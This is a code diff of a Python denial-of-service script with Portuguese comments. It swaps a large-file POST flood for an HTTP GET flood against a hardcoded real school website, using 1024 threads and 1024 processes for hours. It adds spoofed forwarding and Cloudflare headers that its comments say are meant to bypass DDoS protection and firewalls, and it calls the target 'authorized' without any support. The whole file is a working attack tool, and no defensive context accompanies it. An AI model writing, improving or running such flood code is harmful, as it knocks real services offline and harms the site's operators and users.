@@ -1,68 +1,74 @@
-import argparse
 import requests
-import threading
-import time
+from threading import Thread
+from multiprocessing import Process
 import random
+import time
+import string
 
-# Configuração do argumento da linha de comando
-parser = argparse.ArgumentParser(description='Envio de solicitações e arquivos de dados para um site.')
-parser.add_argument('url', type=str, help='URL do site alvo')
-args = parser.parse_args()
+# Função para gerar um cookie aleatório
+def generate_random_cookie(length):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-url = args.url
-rate_limit = 100000000000  # Limite de taxa de bits (1 Gbps)
-
-def send_request():
+# Função para enviar requisições HTTP GET
+def send_get_request(url, headers):
     while True:
-        try:
-            # Criar um arquivo de dados com 717MB
-            file_size = 717 * 1024 * 1024  # 717MB em bytes
-            data = bytearray(file_size)
-            files = {"file": ("data.bin", data)}
-            
-            # Enviar solicitação POST com o arquivo de dados
-            response = requests.post(url, files=files, timeout=10)  # Adiciona timeout de 10 segundos
-            if response.status_code == 200:
-                print("Dados enviados com sucesso")
-                # Adicionar atraso deliberado para manter o site fora do ar
-                time.sleep(30)
-            else:
-                print("Falha ao enviar dados")
-        except requests.exceptions.Timeout:
-            print("Timeout de conexão, tentando novamente...")
-            continue
-        except requests.exceptions.ConnectionError:
-            print("Erro de conexão, tentando novamente...")
-            continue
+        response = requests.get(url, headers=headers)
+        print(f"Request sent to {url}, Response code: {response.status_code}")
 
-# Iniciar threads para enviar solicitações
-def start_threads():
-    while True:
-        try:
-            num_threads = random.randint(30, 100)  # Número aleatório de threads entre 30 e 100
-            threads = []
-            for _ in range(num_threads):
-                thread = threading.Thread(target=send_request)
-                thread.daemon = True
-                threads.append(thread)
-                thread.start()
+# Função para enviar Flood HTTP GET usando Threads
+def flood_with_threads(url, headers, num_threads):
+    for _ in range(num_threads):
+        thread = Thread(target=send_get_request, args=(url, headers))
+        thread.start()
 
-            # Monitorar a taxa de solicitações
-            start_time = time.time()
-            while True:
-                elapsed_time = time.time() - start_time
-                if elapsed_time >= 1:
-                    print(f"Taxa de solicitações: {sum([thread.is_alive() for thread in threads])} solicitações por segundo")
-                    start_time = time.time()
-        except KeyboardInterrupt:
-            break
+# Função para enviar Flood HTTP GET usando Multiprocessing
+def flood_with_multiprocessing(url, headers, num_processes):
+    for _ in range(num_processes):
+        process = Process(target=send_get_request, args=(url, headers))
+        process.start()
 
-# Executar o envio de solicitações a cada 1 a 3 segundos e os 717MB a cada 7 segundos
-try:
-    while True:
-        start_threads()
-        time.sleep(random.randint(1, 3))
-        send_request()
-        time.sleep(7)
-except KeyboardInterrupt:
-    pass
+# URL do site autorizado
+url = "https://ecoescolas.abaae.pt/"
+# Carregar user agents de arquivo
+with open("useragents.txt", "r") as f:
+    user_agents = [line.strip() for line in f.readlines()]
+# Carregar Referers de arquivo
+with open("referers.txt", "r") as f:
+    referers = [line.strip() for line in f.readlines()]
+
+# Configurações
+num_threads = 1024
+num_processes = 1024
+duration = 17014  # duração do ataque em segundos
+
+# Gerar um cookie aleatório
+random_cookie = generate_random_cookie(64)
+
+# Headers com user agents e Referers aleatórios e autenticação de cookie randonizado
+headers = {
+    "User-Agent": random.choice(user_agents),
+    "Referer": random.choice(referers),
+    "Cookie": f"auth={random_cookie}",
+    # Cabeçalhos Bypass para contornar a proteção avançada de DDoS/Firewalls/Cloudflare
+    "X-Forwarded-For": "127.0.0.1",
+    "X-Forwarded-Host": url,
+    "X-Forwarded-Proto": "https",
+    "X-Real-IP": "127.0.0.1",
+    "X-Client-IP": "127.0.0.1",
+    "CF-Connecting-IP": "127.0.0.1",
+    "CF-IPCountry": "US",
+    "CF-Visitor": "{\"scheme\":\"https\"}",
+    "True-Client-IP": "127.0.0.1"
+}
+
+# Mensagem de início do ataque
+print("Attack sent successfully!")
+
+# Enviar Flood HTTP GET usando Threads
+flood_with_threads(url, headers, num_threads)
+
+# Enviar Flood HTTP GET usando Multiprocessing
+flood_with_multiprocessing(url, headers, num_processes)
+
+# Manter o ataque ativo durante a duração especificada
+time.sleep(duration)
